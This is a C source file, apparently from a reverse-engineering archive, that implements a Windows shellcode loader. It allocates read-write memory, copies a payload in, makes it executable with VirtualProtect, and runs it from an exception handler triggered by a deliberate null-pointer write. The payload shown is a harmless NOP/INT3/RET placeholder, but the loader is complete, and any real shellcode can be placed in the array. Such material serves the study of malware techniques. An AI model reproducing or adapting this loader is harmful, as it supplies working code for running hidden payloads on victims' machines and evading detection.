/*
    Shellcode Loader
    Archive of Reversing.ID

    writing shellcode to allocated memory

Compile:
    $ cl.exe /EHsc /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  SetUnhandledExceptionFilter
*/

#include <windows.h>
#include <stdint.h>

// function pointer to shellcode
int  (*func)();

// prototype to exception handler
LONG handler (LPEXCEPTION_POINTERS info);


int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  th_shellcode;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);

    if (retval != 0)
    {
        // point to shellcode
        func = (int (*)())runtime;

        // set exception handler for unhandled exception
        SetUnhandledExceptionFilter(handler);

        // trigger system exception, which will be handled by us
        try 
        {
            char * ptr = NULL;
            *ptr = 'z';
        }
        catch (...)
        { }
    }

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}

LONG handler (LPEXCEPTION_POINTERS info)
{
    UNREFERENCED_PARAMETER(info);

    // execute shellcode
    func();

    return EXCEPTION_EXECUTE_HANDLER;
}